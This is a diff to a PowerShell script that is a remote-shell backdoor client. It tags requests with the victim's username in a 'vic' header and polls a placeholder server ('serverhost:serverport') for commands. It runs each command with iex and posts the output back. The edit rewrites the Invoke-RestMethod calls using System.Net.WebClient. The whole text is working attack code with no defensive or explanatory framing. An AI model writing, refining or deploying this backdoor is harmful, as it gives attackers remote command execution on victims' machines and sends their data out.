@@ -1,13 +1,15 @@
 $user = $env:username
+$webclient = New-object System.Net.WebClient
+$webclient.Headers['vic'] = $user
 while(1){
-    $c = (irm  'http://serverhost:serverport/' -headers @{'vic' = $user})
+    $command = ($webclient.DownloadString('http://serverhost:serverport/'))
     if (-not $?){
         break
     }
-    if ($c){
-    if ($c -eq "exit"){
+    if ($command){
+    if ($command -eq "exit"){
         break
     }
-    irm 'http://serverhost:serverport/' -method POST -Body (iex $c 2>&1 | Out-String -Width 9999)
-    }else {irm 'http://serverhost:serverport/' -method POST -Body $c}
+    $webclient.UploadString('http://serverhost:serverport/','POST',(iex $command 2>&1 | Out-String))
+    }else {$webclient.UploadString('http://serverhost:serverport/','POST',$command)}
 }
